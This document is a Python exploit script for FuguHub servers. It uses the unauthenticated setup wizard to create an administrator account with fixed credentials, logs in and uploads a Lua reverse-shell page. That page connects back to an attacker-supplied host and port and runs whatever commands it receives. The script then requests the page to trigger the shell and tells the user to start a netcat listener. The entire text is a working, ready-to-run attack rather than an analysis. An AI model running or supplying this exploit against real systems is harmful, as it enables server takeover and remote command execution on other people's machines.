import requests

rhost = input("please enter the url fuguhub is running on without the port:")
rport = input("Please enter the port fuguhub is running on:")
lhost = input("please enter the local host for catching the reverse shell:")
lport = input("Pleae enter the local port for catching the reverse shell:")
url = rhost+':'+rport+'/Config-Wizard/wizard/SetAdmin.lsp'

#check to see if admin is alread created
r = requests.get(url)
r = r.text
if "Did you forget your username and password?" in r:
	print("admin account is already created, you need to find the creds to login.")

#if admin not created the create a new admin user account
elif  "Set Administrator Account" in r:
	print("creating new admin user")
	r = requests.post(url,params={"email":"admin@admin.com","user":"admin","password":"p@ssw0rd","recoverpassword":"on"})
	r = (r.text)
	if "Administrator Account Saved" in r:
		print("Admin account created with creds admin:password\nAttemting to login")
		r = requests.post(rhost+":"+rport+"/rtl/protected/wfslinks.lsp",data = {'ba_username' : 'admin' , 'ba_password' :'p@ssw0rd'})
		r = (r.text)
		#check to make sure we can login with the creds to the fs directory
		if "Web File Server" in r:
			print("success, checking for file server directory")
			r = requests.get(rhost+':'+rport+"/fs/",auth=('admin','p@ssw0rd'))
			r = (r.status_code)
			if r == 200:
				print("found directory, attempting to upload lsp exploit")
				#create the contents for the shell file
				shell = f'local host, port = "{lhost}", "{lport}" \nlocal socket = require("socket")\nlocal tcp = socket.tcp() \nlocal io = require("io") tcp:connect(host, port); \n while                    true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
				content = f"<?lsp {shell} ?>"
				shellFile = {'file': ('shell.lsp',content, 'application/octet-stream')}
				#send the exploit with a post request and check if it was uploaded successfully
				r = requests.post(rhost+':'+rport+"/fs/", auth=('admin','p@ssw0rd') ,files=shellFile)
				r = (r.text)
				print(r)
				if 'ok' in r:
					print("uploaded shell.lsp successfully")
					#execute the exploit
					exp = input("please setup a nc listener on the port you specified and hit enter to get your shell.")
					r = requests.get(rhost+':'+rport+"/shell.lsp")
			else:
				pass
		else:
			print("unsuccessful")
